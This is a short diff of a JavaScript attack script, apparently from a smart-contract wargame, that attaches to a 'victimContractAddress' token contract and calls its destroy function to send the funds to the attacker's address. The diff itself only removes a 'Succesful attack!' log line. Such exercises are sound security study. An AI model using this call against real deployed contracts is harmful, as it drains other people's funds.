@@ -9,8 +9,6 @@ async function main() {
   const simpleToken = SimpleToken.attach(victimContractAddress);
 
   await simpleToken.destroy(myPublicKey); 
-
-  console.log("Succesful attack!");
 }
 
 main()
